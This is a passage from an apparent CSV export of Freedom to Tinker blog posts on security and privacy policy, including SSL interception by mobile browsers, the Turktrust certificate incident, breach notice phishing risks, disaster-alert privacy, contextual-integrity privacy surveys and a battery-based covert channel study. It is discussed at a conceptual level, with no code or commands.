Opera Mini is another example. Opera Mini is a version of the Opera browser, designed for lower-performance mobile devices, that sends all traffic through Opera proxies. These proxies do extensive pre-processing of web pages, and return a highly optimized version of the web page via a standard called OBML. This includes SSL traffic, for which there is a similar “man-in-the-client” that sends SSL-destined traffic to the Opera Mini proxy encrypted with keys that the proxy knows and can decrypt. Opera got significant flak for this, and has since gone out of their way to explain on their web site that “If you do not trust Opera Software, make sure you do not use Opera Mini to enter any kind of sensitive information.” However, when I installed the Opera Mini browser on my phone, I wasn’t pointed to those warnings. I saw the Opera Mini EULA, and the Opera Mini Privacy Statement, which do not include such language. So, as opposed to Nokia, Opera has made an effort to alert users to the browser’s SSL decryption–although I think they could do much better. Opera also may have a more compelling case for why they need to do this interception. Their browser only understands OBML, not HTML. It wouldn’t know what to do with the HTML contents of a non-intercepted SSL connection. It’s not clear to me how Xpress works internally, but the user-agent coming through their proxy declares it to be a Gecko-based client, which is built to render HTML. To be clear, I think that any “man-in-the-client” SSL interception is a bad idea. I don’t think that engineers should sacrifice security in the name of efficiency in this case. If it’s not possible to maintain end-to-end encryption with the given technology, then the engineers need to think harder about how to tweak the technology to make it possible. However, where it is done, it’s clearly better that it is prominently disclosed. What does Nokia Xpress communicate to the end user about all of this? When installing and using Nokia Xpress, I took the following two screenshots. The first is the initial user agreement page, which as of 9:24pm Eastern time last night included the somewhat-cryptic sentence, “Https connections will be decrypted in a secure manner.” I wonder if this is part of Nokia’s attempt to “review the information provided in the mobile client in case this can be improved,” and I wonder if this sentence existed a week ago. It’s certainly not transparent what they are referring to, and as an end-user it would not be at all clear to me what this means. Which HTTPS connections? I would expect that the client would decrypt my HTTPS communications with Freedom to Tinker in a secure manner, but I don’t think that’s what they intended to convey. The larger story here is that as more of our communications move to mobile devices and to the cloud, we will encounter surprising exceptions to our expectations for secure communications. Browsers like Nokia Xpress and Opera Mini are essentially moving our web browsing to the cloud–pushing the security functions that we traditionally thought existed in a safe zone within our device to far-away servers. At the same time, our devices can betray us by aiding and abetting this security offloading. This was one of the messages of Jonathan Zittrain’s recent talk at CRYPTO 2012, “The End of Crypto.” His title was a play on words, and in the latter half he emphasizes the “Ends” of crypto. His message is that security of the end-points will be increasingly important in a networked, mobile, and cloud-based environment. The broad lessons are twofold: 1. What happens “in the cloud” is increasingly relevant to privacy and security 2. What happens “on the device” (especially mobile) is in flux, and misunderstandings or missteps can be risky At such a high level, these may seem like a no-brainer. They are no surprise. That being said, specific cases like Nokia’s SSL decryption are quite surprising indeed."
"368","2013-01-03","2023-03-24","https://freedom-to-tinker.com/2013/01/03/turktrust-certificate-authority-errors-demonstrate-the-risk-of-subordinate-certificates/","Update: More details have continued to come out, and I think that they generally support the less-paranoid version of events. There continues to be discussion on the mozilla.dev.security.policy list, Turktrust has given more details, and Mozilla has just opened up for public viewing their own detailed internal response documentation (including copies of all of the certs in question). None of this changes the fundamental riskiness of subordinate certificates, or the improvements that should be made to the CA system. It just means that in this case, the failure didn’t progress to a full-blown meltdown. Today, the public learned of another failure by a Certificate Authority–one of of companies that certifies SSL-encryption for our internet communications. (See the end of this post for a catalogue of our past writing on problems with this “CA” system.) This time, the company Turktrust was revealed to have issued two subordinate certificates (also known as “intermediate” certificates) to entities that should not have had them. Subordinate certificates are very powerful. They give the holder the ability to issue SSL certificates for any domain name as though they have control of the parent CA’s “root” certificate. In this case, Google discovered that one of Turktrust’s previously undisclosed subordinate certificates had issued SSL certificates for the domain gmail.com, and that these certificates had been used to intercept Gmail users’ traffic… somewhere. This is where the details get foggy, but Turktrust has begun to describe their version of events. There is a less paranoid and a more paranoid way of interpreting what happened. According to Turktrust, they made some configuration errors in late 2011 that caused them to inadvertently hand out subordinate certificates to two entities–the Turkish government and a Turkish bank. They claimed that these users expected to receive ordinary SSL certificates that could be used to secure their own web sites, not what amounts to a master “skeleton key” to the internet. This assertion is somewhat supported by the fact that one of these certificates appears to have been used for precisely that until recently, at www.ego.gov.tr (which seems to be the web site for the capital city of Ankara or one of its offices, but I’m sure that Zeynep will clear this up in the comments). Turktrust says that the certificate was used by the government to provide SSL-encrypted webmail–presumably for government employees (As a further side-note, it is unclear whether deploying subordinate certificates as though they are ordinary SSL certificates will cause some or all browsers to generate an error, but perhaps it worked for them). In any case, Turktrust says that a government system administrator recently loaded the certificate onto a “firewall” that proceeded to perform man-in-the-middle attacks on individuals who attempted to browse to secure web sites like gmail.com. It’s not clear what network this device was on (although it was evidently manufactured by Check Point), and which individuals were affected. The least paranoid version of suggests that the device sat between the government’s internal network and the public internet, and that the only individuals affected were government employees in that office. The more paranoid version of events is perhaps less likely, but it helps to highlight some fundamental shortcomings in the Certificate Authority system. Subordinate certificates have long been identified as a point of weakness in the CA system. They are typically granted unconstrained power to issue certificates for any domain name. Thus, a leak of one subordinate certificate is seen as equivalent to a leak of authority equivalent to all CAs combined. Worse, subordinate certificates need not be explicitly trusted by the software that authenticates encrypted SSL connections (typically your web browser). They inherit their trust from the explicitly trusted CAs that have been vetted by your browser vendor. Browser vendors have slowly been trying to reign in the practices of CAs that issue subordinate certificates to third parties. For instance, when CA Trustwave admitted that it had been selling subordinate certificates to third parties for the purpose of performing man-in-the-middle attacks, Mozilla made clear that this was unacceptable. That being said, depending on your browser, there may be a couple hundred trusted CAs. Hoping that they all comply with a policy is probably not enough. I have spent the past couple of years trying to convince Mozilla to strengthen their requirements so that CAs must disclose all subordinate certificates that they have issued, so that researchers can better map the risk landscape and so that users can make more informed trust decisions and detect unexpected subordinates. They’re getting closer, but it is taking an awfully long time. Several years ago, security researchers Christopher Soghoian and Sid Stamm described the “compelled certificate creation attack” in which a government would compel a local CA to produce a subordinate certificate that it would then use to conduct mass or targeted man-in-the-middle surveillance on its citizens. We are justified in indulging in a bit of professional paranoia, given that the Turktrust subordinate certificate in question was controlled by the Turkish government, and that it was used to perform man-in-the-middle attacks. It also happens to be the case that Turktrust satisfied its annual compliance audits by having the Turkish government audit their operations, as opposed to the more common practice of obtaining an audit from a commercial auditing firm (although they claim to have recently obtained a commercial audit, they have yet to publish any documentation of this as far as I can tell). Turktrust has begun to give some answers, but it’s worthwhile to keep probing. Mozilla revoked trust in one of Turktrust’s three “root” CA certificates, as did Google–but oddly the revoked root is not the certificate that issued the subordinate certificates in question. It is a new root certificate (included in Firefox only in beta releases so far), and it is intended to be used only for issuing higher-standard “extended validation” certificates. It appears that the browsers’ strategy is to provide some mild punishment to Turktrust without disrupting the operation of legitimate sites that have obtained standard SSL certificates from them in the past. Representatives from both browser vendors have stated that it is unclear how they will proceed, and one can imagine that they would restore trust in this root at some point in the future. Is Turktrust’s behavior sufficient that trust in all three of their roots should instead be removed permanently? The facts are still emerging. Relevant past posts: Mozilla Debates Whether to Trust Chinese CA Web Security Trust Models Web Certification Fail: Bad Assumptions Lead to Bad Technology A Major Internet Milestone: DNSSEC and SSL General Counsel’s Role in Shoring Up Authentication Practices Used in Secure Communications The Flawed Legal Architecture of the Certificate Authority Trust Model Web Browsers and Comodo Disclose A Successful Certificate Authority Attack, Perhaps From Iran Building a better CA infrastructure DigiNotar Hack Highlights the Critical Failures of our SSL Web Security Model"
"369","2019-11-08","2023-03-24","https://freedom-to-tinker.com/2019/11/08/enhancing-the-security-of-data-breach-notifications-and-settlement-notices/","[This post was jointly written by Ryan Amos, Mihir Kshirsagar, Ed Felten, and Arvind Narayanan.] We couldn’t help noticing that the recent Yahoo and Equifax data breach settlement notifications look a lot like phishing emails. The notifications make it hard for users to distinguish real settlement notifications from scams. For example, they direct users to URLs on unfamiliar domains that are not clearly owned by the company that was breached nor any other trusted entity. Practices like this lower the bar for scammers to create fake phishing emails, potentially victimizing users twice. To illustrate the severity of this problem, Equifax mixed up domain names and posted a link to a phishing website to their Twitter account. Our discussion paper presents two recommendations to stakeholders to address this issue. First, we recommend creating a centralized database of settlements and breaches, with an authoritative URL for each one, so that users have a way to verify the notices distributed. Such a database has precedent in the Consumer Product Safety Commission (CPSC) consumer recall list. When users receive notice of a data breach, this database would serve as a reliable authority to verify the information included in the notice. A centralized database has additional value outside the data breach context as courts and government agencies increasingly turn to electronic notices to inform the public, and scammers (predictably) respond by creating false notices. Second, we recommend that no settlement or breach notice include a URL to a new domain. Instead, such notices should include a URL to a page on a trusted, recognizable domain, such as a government-run domain or the breached party’s domain. That page, in turn, can redirect users to a dedicated domain for breach information, if desired. This helps users avoid phishing by allowing them to safely ignore links to unrecognized domains. After the settlement period is over, any redirections should be automatically removed to avoid abandoned domains from being reused by scammers."
"370","2018-10-09","2023-03-24","https://freedom-to-tinker.com/2018/10/09/disaster-information-flows-a-privacy-disaster/","By Madelyn R. Sanfilippo and Yan Shvartzshnaider Last week, the test of the Presidential Alert system, which many objected to on partisan grounds, brought the Wireless Emergency Alert system (WEA) into renewed public scrutiny. WEA, which distributes mobile push notifications about various emergencies, crises, natural disasters, and amber alerts based on geographic relevance, became operational in 2012, through a public private partnership between the FCC, FEMA, and various telecommunications companies. All customers of participating wireless providers are automatically enrolled, though it is possible to opt out of all but Presidential Alerts. Presidential alerts were just one of a set of updates designed to address recent events that have connected the trusted communication channel to the fear politics around fake news and misinformation, such as the January 2018 false alarm, when a ballistic missile warning was mistakenly disseminated to the state of Hawaii as a mobile emergency alert. The resulting chaos and outrage, led the FCC to revise protocols for tests of the system, distribution, and emergency alert formats, among other improvements. In updating WEA, three priorities are addressed: (1) routine “live code testing” to ensure function and minimize confusion; (2) incorporate additional and local participants into new and existing official channels; and (3) prevent misinformation or false alarms, by authentication, unifying format and overriding opt-out preferences in distributing the presidential alert. The objective is to provide trustworthy information during crises. Yet the specific changes have triggered concerns that allowing partisan officials and mimicking format conventions like character limits undermine the stated objectives, by facilitating imitation for disinformation, rather than engendering confidence in official alerts, as stated in a legal complaint about Presidential Alerts. With the increased scrutiny around these changes, additional concerns around privacy and surveillance relative to disaster information communication practices have arisen. WEA structures information flows from multiple Federal agencies, along with agency specific Apps, based on aggregated personally identifiable information, including geo-location information, all of which are governed by privacy regulations, including the Privacy Act of 1974, and policies that focus on protecting accidental or malicious disclosure of Personal Identifiable Information (PII) and Sensitive Personally Identifiable Information (SPII). Policies and regulations enumerate a list of trusted partners with which the data will be shared and from whom it may be gathered during emergencies. The specific types of information that can be gathered about individuals by FEMA, despite the diversity of sources and contexts involved, are precisely defined, such as: name; social media account information; address of geo-location; job title; phone numbers, email addresses, or other contact information; date and time of post; and additional relevant details, including individuals’ physical condition. Furthermore, information sharing policies governance is less precise with regard to flows, than types. This is particularly important because expectations change drastically when disaster hits. Everyday information flows are governed by established norms within a particular context. Yet, disasters change our priorities and norms, as our survival instincts kick in. For example, our norms can oscillate between two extremes; on one side, we do not want to tracked in our daily activities, but during disasters, many feel comfortable broadcasting locations and possibly medical conditions to everyone in the area in order to be found and survive. Previous research had shown that users’ tend to be more lenient towards sharing information, that they normally wouldn’t with emergency services and other relevant agencies that are involved in the recovery situation. While governance restricts disclosure of personally identifiable information information without users’ explicit consent, disclosures are exempt from asking for an explicit consent if efforts fall under “Routine Use” such as “Disaster Missions.” “Routine use” exclusion has broad implications, given the broad and permissive definitions, including: allowing “information sharing with external partners to allow them to provide benefits and services” (Routine Use H); allowing “FEMA to share information with external partners so FEMA can learn what our external partners have already provided to disaster survivors,” as well as disclosing “applicant information to a 3rd party” in order “To prevent a duplication of benefits” (Routine Use I); and requiring 3rd parties to disclose personal information to FEMA, relative to assistance provided. The advent of the web along with the popularity of social media present a unique opportunity for agencies like FEMA, as they attempt to leverage new technologies and available user information to assist in preparation and recovery efforts. Increasingly, emergency agencies rely on disaster information flows from and to various opt-in apps–including Nextdoor, which allows calls for help when 911 is down; Life 360, which is helpful in tracking evacuations; and those from the Red Cross–during crises. Additional categories of supplementary third party services and applications include: Social networks: FEMA uses public data available on social media to help its operation. Twitter, Google and Facebook are also investing further resources to deliver features for users and emergency services specific to disasters. Apple and Google have also promoted various other emergency and disaster response mobile apps during this ongoing hurricane season. 3rd Party applications: Numerous diverse 3rd parties exist in this increasingly sociotechnical domain of FEMA partnerships relative to disaster communication, response, and recovery. Red Cross Apps provide one of the most popular supplements to WEA notifications and FEMA apps, sharing critical response data with other emergency response organizations and agencies. Ostensibly this standardizes critical information flows between stakeholders. However, it highlights individual users’ privacy concessions and challenges the regulatory schema on-the-books, particularly given that users of many of these emergency apps who opt-in for self-reporting are then tracked persistently, until they opt-out or uninstall, rather than the end of emergency. IoT devices, drones: Increasingly, drones and IoT monitor disasters in concert with third party applications are being deployed to complement FEMA and other agencies service in the field. The information flows between involved stakeholders might not always align with users’ expectations. In order to better balance pressing public safety concerns with long term consequences we need to understand information flows in practice around disasters. The following questions will be considered in our future work, structured through the contextual integrity framework: What do disaster information flows look like in practice? There are many diverse official and third party channels. Despite good intentions, few have thoroughly considered whether the information flows they facilitate conform to users’ privacy expectations, or if not, whether they might lead to a privacy disaster, pun intended. This is especially critical in crisis situations, during which safety concerns tend to overshadow individuals’ privacy preferences. How do rules-in-use about Information flows between stakeholders compare to governance on the books? Loopholes in requiring partners of agencies like FEMA to fully disclose the information they communicate around disasters, including PII and SPII used to personalize communications. Despite the imposed restrictions on gathering personal information and routine uses, it is important to raise additional questions about how broadly permissive social acceptance of reduced privacy under crisis conditions might be conflict with actual understanding of information flows in practice. Where do we store information and for how long? Temporal aspects of privacy and the persistent location-monitoring associated with emergency channels raise real questions about perceptions on appropriate information flows around disasters and emergencies."
"371","2020-01-07","2023-03-24","https://freedom-to-tinker.com/2020/01/07/the-unknown-history-of-digital-cash/","How could we create “a digital equivalent to cash, something that could be created but not forged, exchanged but not copied, and which reveals nothing about its users”? Why would we need this digital currency? Dr. Finn Brunton, Associate Professor in the Department of Media, Culture, and Communication at NYU, discussed his new book Digital Cash: The Unknown History of the Anarchists, Utopians, and Technologists Who Created Cryptocurrency on November 19th, 2019 with CITP’s Technology and Society Reading Group. Footage aired on C-SPAN’s Book TV. Through a series of “how” and “why” questions, Finn constructed a fascinating and critical narrative around the history of digital currencies and the emergence of modern cryptocurrency. How much currency should be produced? How do we know if currency is real? Why gold, relative to digital gold currencies (DGCs)? Beginning with the $20 bill, as analog “beautiful objects of government technology” made possible in a digital era by the rose engine lathe, and ending with the first ever tweet about Bitcoin (“Running bitcoin”), posted by Hal Finney (@halfin), Finn described the unexpected sociotechnical origins of Bitcoin and blockchain. His talk, and the book on which it was based, identify seminal articles (e.g. “The Computers of Tomorrow” by Martin Greenberger) and discussion communities (e.g. Extropy), key figures from David Chaum and Paul Armer to Tim May and Phil Salin, and digital currencies, from EFTs to hashcash, that served as stepping stones toward contemporary cryptocurrencies. Yet, Finn also importantly acknowledged that while names and dates are memorable and compelling in constructing a timeline and pulling continuous threads through this history, there are “n+1” ideas about and versions of digital currency. In this sense, Finn provides, more so than an attempt at a comprehensive chronology, a sense of the recurring objectives that motivated the evolution of cryptocurrency: trust in value, exchangeability, multiplicity, reproducibility, decentralization, abundance, scalability, sovereignty, verification, authenticity, fungibility, and transparency. In addition to these many, often “fundamentally conflicting,” values and objectives, very real concerns about privacy, surveillance, coercion, power asymmetries, and libertarian fears of crises and “the coming emergencies” led individuals and communities to develop their own digital currencies. Finn also identified some of the problematic narratives around digital currencies, such as the assertion that cryptocurrency is “as real as math”, and real challenges that have stymied and limited various experimental currencies. Many of these challenges were highly apparent as Finn described the rise and fall of DGCs. The strange union between futuristic digital currency and precious metals, particularly gold in its “magnificent, stupid honesty,” emerged in many parallel libertarian communities in the US and around the world, as digital and analog receipts of ownership in precious metals were distributed to document remote stored value in a decentralized system. Finn explained how these DGCs (e.g. “eLiberty Dollars” or “The Second Amendment Dollar”) challenged the power and authority of state currencies and modern banking and how the abrupt seizure of precious metal stockpiles, as evidence, by Federal Marshals foreshadowed some of the inaccessibility problems of cryptocurrency, as well as the relationships between illicit activities and digital currencies which now exist on the Silk Road. Finn ended the discussion answering audience questions, including about power dynamics and the libertarian origins of cryptocurrency. His assertion that money and crisis are linked, not only in the “economy of emergency preparedness,” but also in key points of progress toward “the future of money” is compelling in identifying how digital currencies fit into this historical pattern in a larger monetary history."
"372","2018-07-10","2023-03-24","https://freedom-to-tinker.com/2018/07/10/iot-in-context/","by Noah Apthorpe, Yan Shvartzshnaider, Arunesh Mathur, Nick Feamster Privacy concerns surrounding disruptive technologies such as the Internet of Things (and, in particular, connected smart home devices) have been prevalent in public discourse, with privacy violations from these devices occurring frequently. As these new technologies challenge existing societal norms, determining the bounds of “acceptable” information handling practices requires rigorous study of user privacy expectations and normative opinions towards information transfer. To better understand user attitudes and societal norms concerning data collection, we have developed a scalable survey method for empirically studying privacy in context. This survey method uses (1) a formal theory of privacy called contextual integrity and (2) combinatorial testing at scale to discover privacy norms. In our work, we have applied the method to better understand norms concerning data collection in smart homes. The general method, however, can be adapted to arbitrary contexts with varying actors, information types, and communication conditions, paving the way for future studies informing the design of emerging technologies. The technique can provide meaningful insights about privacy norms for manufacturers, regulators, researchers and other stakeholders. Our paper describing this research appears in the Proceedings of the ACM on Interactive, Mobile, Wearable and Ubiquitous Technologies. Scalable CI Survey Method Contextual integrity. The survey method applies the theory of contextual integrity (CI), which frames privacy in terms of the appropriateness of information flows in defined contexts. CI offers a framework to describe flows of information (attributes) about a subject from a sender to a receiver, under specific conditions (transmission principles). Changing any of these parameters of an information flow could result in a violation of privacy. For example, a flow of information about your web searches from your browser to Google may be appropriate, while the same information flowing from your browser to your ISP might be inappropriate. Combinatorial construction of CI information flows. The survey method discovers privacy norms by asking users about the acceptability of a large number of information flows that we automatically construct using the CI framework. Because the CI framework effectively defines an information flow as a tuple (attributes, subject, sender, receiver, and transmission principle), we can automate the process of constructing information flows by defining a range of parameter values for each tuple and generating a large number of flows from combinations of parameter values. Applying the Survey Method to Discover Smart Home Privacy Norms We applied the survey method to 3,840 IoT-specific information flows involving a range of device types (e.g., thermostats, sleep monitors), information types (e.g., location, usage patterns), recipients (e.g., device manufacturers, ISPs) and transmission principles (e.g., for advertising, with consent). 1,731 Amazon Mechanical Turk workers rated the acceptability of these information flows on a 5-point scale from “completely unacceptable” to “completely acceptable”. Trends in acceptability ratings across information flows indicate which context parameters are particularly relevant to privacy norms. For example, the following heatmap shows the average acceptability ratings of all information flows with pairwise combinations of recipients and transmission principles. Average acceptability scores of information flows with given recipient/transmission principle pairs. For example, the top left box shows the average acceptability score of all information flows with the recipient “its owner’s immediate family” and the transmission principle “if its owner has given consent.” Higher (more blue) scores indicate that flows with the corresponding parameters are more acceptable, while lower (more red) scores indicate that the flows are less acceptable. Flows with the null transmission principle are controls with no specific condition on their occurrence. Empty locations correspond to less intuitive information flows that were excluded from the survey. Parameters are sorted by descending average acceptability score for all information flows containing that parameter. These results provide several insights about IoT privacy, including the following: Advertising and Indefinite Data Storage Generally Violate Privacy Norms. Respondents viewed information flows from IoT devices for advertising or for indefinite storage as especially unacceptable. Unfortunately, advertising and indefinite storage remain standard practice for many IoT devices and cloud services. Transitive Flows May Violate Privacy Norms. Consider a device that sends its owner’s location to a smartphone, and the smartphone then sends the location to a manufacturer’s cloud server. This device initiates two information flows: (1) to the smartphone and (2) to the phone manufacturer. Although flow #1 may conform to user privacy norms, flow #2 may violate norms. Manufacturers of devices that connect to IoT hubs (often made by different companies), rather than directly to cloud services, should avoid having these devices send potentially sensitive information with greater frequency or precision than necessary. Our paper expands on these findings, including more details on the survey method, additional results, analyses, and recommendations for manufacturers, researchers, and regulators. We believe that the survey method we have developed is broadly applicable to studying societal privacy norms at scale and can thus better inform privacy-conscious design across a range of domains and technologies."
"373","2016-10-31","2023-03-24","https://freedom-to-tinker.com/2016/10/31/learning-privacy-expectations-by-crowdsourcing-contextual-informational-norms/","[This post reports on joint work with Schrasing Tong, Thomas Wies (NYU), Paula Kift (NYU), Helen Nissenbaum (NYU), Lakshminarayanan Subramanian (NYU), Prateek Mittal (Princeton) — Yan] To appear in the proceedings of the Fourth AAAI Conference on Human Computation and Crowdsourcing (HCOMP 2016) We would like to thank Joanna Huey for helpful comments and feedback. Motivation The advent of social apps, smart phones and ubiquitous computing has brought a great transformation to our day-to-day life. The incredible pace with which the new and disruptive services continue to emerge challenges our perception of privacy. To keep apace with this rapidly evolving cyber reality, we need to devise agile methods and frameworks for developing privacy-preserving systems that align with evolving user’s privacy expectations. Previous efforts [1,2,3] have tackled this with the assumption that privacy norms are provided through existing sources such law, privacy regulations and legal precedents. They have focused on formally expressing privacy norms and devising a corresponding logic to enable automatic inconsistency checks and efficient enforcement of the logic. However, because many of the existing regulations and privacy handbooks were enacted well before the Internet revolution took place, they often lag behind and do not adequately reflect the application of logic in modern systems. For example, the Family Rights and Privacy Act (FERPA) was enacted in 1974, long before Facebook, Google and many other online applications were used in an educational context. More recent legislation faces similar challenges as novel services introduce new ways to exchange information, and consequently shape new, unconsidered information flows that can change our collective perception of privacy. Crowdsourcing Contextual Privacy Norms Armed with the theory of Contextual Integrity (CI) in our work, we are exploring ways to uncover societal norms by leveraging the advances in crowdsourcing technology. In our recent paper, we present the methodology that we believe can be used to extract a societal notion of privacy expectations. The results can be used to fine tune the existing privacy guidelines as well as get a better perspective on the users’ expectations of privacy. CI defines privacy as collection of norms (privacy rules) that reflect appropriate information flows between different actors. Norms capture who shares what, with whom, in what role, and under which conditions. For example, while you are comfortable sharing your medical information with your doctor, you might be less inclined to do so with your colleagues. We use CI as a proxy to reason about privacy in the digital world and a gateway to understanding how people perceive privacy in a systematic way. Crowdsourcing is a great tool for this method. We are able to ask hundreds of people how they feel about a particular information flow, and then we can capture their input and map it directly onto the CI parameters. We used a simple template to write Yes-or-No questions to ask our crowdsourcing participants: “Is it acceptable for the [sender] to share the [subject’s] [attribute] with [recipient] [transmission principle]?” For example: “Is it acceptable for the student’s professor to share the student’s record of attendance with the department chair if the student is performing poorly? ” In our experiments, we leveraged Amazon’s Mechanical Turk (AMT) to ask 450 turkers over 1400 such questions. Each question represents a specific contextual information flow that users can approve, disapprove or mark under the Doesn’t Make Sense category; the last category could be used when 1) the sender is unlikely to have the information, 2) the receiver would already have the information, or 3) the question is ambiguous. Approximation of Users’ Privacy Expectations In our evaluation we show that by converting the answers into CI-based privacy logic we are able to effectively analyze and detect privacy norms that users are more likely to approve and care about. More specifically, we introduced three indicators that provide an estimate of users’ “acceptance” of the entrenched or enforced norms: the norm approval score, the user approval score and the divergence score. We show that, using these indicators, we can identify norms that were approved or disapproved by majority of users, while also pinpointing contentious norms that require further attention. The norm approval score (NA) is the ratio of the number of users approving the norm (by providing a positive answer to the corresponding question) to the total number of responses to that norm. We can filter approved norms based on a certain NA threshold, e.g., a simple majority (>50%) or two-thirds majority (>67%). The table below lists the five norms with the highest NA values and the five with the highest norm disapproval values (i.e., the ratio of the number of users disapproving the norm to the total number of responses). The numbers in the Transmission Principle (TP) column of represent the following transmission principles: 1) with the requirement of confidentiality; 2) if subject is performing poorly; 3) with a request from the subject; 4) with subject’s knowledge; and 5) with subject’s consent. We see, for example, that the surveyed community strongly approves an informational flow where a professor provides a graduate school with a student’s attendance record with the student’s permission. However, they strongly oppose a TA sharing a student’s grades with classmates, if the student is performing poorly. The user approval score (UA) is the ratio of the number of norms a user approved to the total number of norms she evaluated. It reflects individual users’ norm approving records, while the divergence score (DS) compares individual preferences to the opinion of the overall community. It counts how many times the user’s preferences differed from the community preferences, where community preferences are defined by a chosen NA threshold, so a lower DS score means higher agreement with the community as a whole. The figure below plots DS vs UA with the NA threshold set at 66%. Users that have a high UA score also have a higher DS, meaning that users who agreed with a high proportion of norms diverged more from the community consensus. This correlation can be explained by the fact that norms are less frequently approved when the NA threshold is high, so users with a high UA on average will differ more from the community. The next figure depicts total DS across all possible thresholds: for each NA threshold, we calculated and aggregated the DS score for each of the users. The final number was normalized by the number of the users. We can use this plot to choose an appropriate NA threshold by picking a value that yields the lowest aggregate DS for the community; in this case, a threshold in the 40% to 60% range yields the lowest disagreement from the community. Verification of Extracted Rules We then used formal verification methods to check for consistency in crowdsourced privacy logic. We relied on automated theorem provers to detect any potential logical inconsistencies in the rules, e.g., to check that the approved information flows are not blocked by the ones that were disapproved. More specifically, we encode the resulting CI rules into first-order logic that can be mapped onto Effectively Propositional Logic (EPR) [4], where each CI rule is represented as a conjunction that involves the auxiliary predicates and (dis)equalities for given CI parameters. Future Directions This is a first step in a project that seeks to explore how modern technology can better match practices to individual users’ privacy expectations and also how to adopt privacy norms supported by the community as a whole. We hope that this framework will be useful in developing systems that incorporate CI principles and that reflect individual and communal norms. Crowdsourcing offers an efficient way to seed such systems with initial data on community norms, and those norms can then be further refined—and evolved—through ongoing user feedback."
"374","2018-06-20","2023-03-24","https://freedom-to-tinker.com/2018/06/20/exfiltrating-data-from-the-browser-using-battery-discharge-information/","Modern batteries are powerful – indeed they are smart, and have a privileged position enabling them to sense device utilization patterns. A recent research paper has identified a potential threat: researchers (from Technion, University of Texas Austin, Hebrew University) devise a scenario where malicious batteries are supplied to user devices (e.g. via compromised supply chains): An attacker with brief physical access to the mobile device – at the supply chain, repair shops, workplaces, etc. – can replace the device’s battery. This is an example of an interdiction attack. Interdiction attacks using malicious VGA cables have been used to snoop on targeted users. Malicious battery introduces a new attack vector into a mobile device. Poisoned batteries are thus capable of monitoring the victim’s system use, leading to the recovery of sensitive user information, such as: visited websites (with around 65% precision, better than a random guess), typed characters (accuracy better than random guess), when a camera shot is made, and incoming calls. Detection of the sensitive user data is an example of power analysis, exploiting a side channel information leak. Finally, the battery is also used to exfiltrate information to the attackers. The whole attack is rather technically complex, and it is subject to debate how practical it could be to real-world attackers at this moment. But it is nonetheless very interesting, as it highlights how complex our computing devices really are, and that there is an inherent need to trust the components of our devices. I’d like to call special attention to the exfiltration channel using the battery. It is a very interesting covert channel. The W3C Battery Status API, implemented by major web browsers, notably Chrome, allows websites to query the information about the current battery level, as well as to disclose the rate of charge/discharge. The paper describes an exploitation of the Battery Status API in order to remotely exfiltrate acquired data. All the victim user has to do is to visit a sink website that is reading the data. Malicious batteries can detect when the browser enters this special website, and enable the exfiltration mode. And how is the exfiltration done? It works by manipulating of “charging” states – the 0/1 state informing a website that the battery is either charging or discharging. But how to induce a steady stream of “charging” event changes in a way that encodes information? The employed technique is very interesting: it uses wireless charging, i.e. by placing a resonant inductive charger into the battery chip. What needs to be done is to place a charging coil close to the battery hardware. Sounds complicated? It does not need to be, since we assume that an attacker is able to deliver a malicious battery in the first place. Then all the user has to do is to visit a website that would read the information using the standard W3C Battery Status API, when supported by the web browser (e.g.. Chrome is vulnerable but Firefox is immune). In principle, everything is done without any interaction with the Operating System – it is oblivious to the OS. There is also this interesting observation: Since the browser does not seem to limit the update rate, the state change depends entirely on the phone’s software and the charging pad state transition rate. We find that the time to detect the transition from not charging to charging (Tdc) is 3.9 seconds. This allows the attacker to obtain a covert channel with a bandwidth of 0.1-0.5 bits/second. Of course there is no reason for browsers to allow frequent switches between charge/discharge events. So the Privacy by Design methodology here would be to cap the switch rate. The attack may seem like a stretch (requires physical battery replacement – or poisoning hardware at a factory), and at this moment one can imagine multiple simpler methods. Nonetheless it is an important study. Is the sky falling? No. Is the work significant? Yes. For more information, please see the paper here. For more information about the privacy by design case study of the Battery Status API, see here."
"375","2018-02-09","2023-03-24","https://freedom-to-tinker.com/2018/02/09/making-sense-of-child-protection-predictive-models-tech-soc-reading-group-feb-20/","How are predictive models transforming how we think about child protection, and how should we think about the role of such systems in a democracy? If you’re interested to ask these questions, join us at 2-3pm on Tuesday, Feb 20th at Sherrerd Hall room 306 for our opening Technology and Society Reading group meeting. The conversation is open to anyone who’s interested, and who’s willing to do the reading in advance. (if you’re interested, come for our lunch talk that day as well, which focuses on privacy & safety concerning intimate partner violence) In 2016, Allegheny County, which includes the city of Pittsburgh, became the first region in the US to use a predictive model to “identify families most in need of intervention” for their department of Children, Youth and Families. These models create a risk score for children who might be at risk of violence and guide decisions about followup by government employees. In January 2018, three very different perspectives were published widely about this system: a New York Times Magazine article, a chapter in Virginia Eubanks’s new book Automating Inequality (blog post here), and a new academic paper by the creators of the system that outlines the work they’ve done to make the system transparent and fair. Eubanks, Virginia (Jan 2018) A Child Abuse Prediction Model Fails Poor Families. WIRED Magazine Hurley, Dan. (Jan 2018) Can An Algorithm Tell When Kids are in Danger? New York Times Magazine Chouldechova, A., Benavides-Prado, D., Fialko, O., & Vaithianathan, R. (2018, January). A case study of algorithm-assisted decision making in child maltreatment hotline screening decisions. In Conference on Fairness, Accountability and Transparency (pp. 134-148). About the Technology and Society Reading Group At the Center for Information Technology Policy, we bring together people with expertise in technology, engineering, policy, and the social sciences to ask those questions and develop new approaches together. You can sign up for the mailing list here, where you will receive reading material for discussion before the event. This semester, conversations will be organized by CITP fellows J. Nathan Matias and Ben Zevenbergen. If you have ideas for a conversation you would like to see us discuss, please email Nathan ( *protected email*) and Ben ( *protected email*) with suggestions, and some references that you think might be interested Time: every other Tuesday from 2pm-3pm, starting Feb 20th Feb 20th: Using AI for child protection in Allegheny County, PA March 6th: Privacy, Ethics, and High-dimensional Social Science Data Matt Salganik Ian D. Lundberg Arvind Narayanan Karen Levy March 20th: Case Studies in AI Ethics Ben Zevenbergen Chloe Bakalar April 3rd: TBA April 17th: TBA May 1st: TBA May 15th: TBA May 29th: TBA"
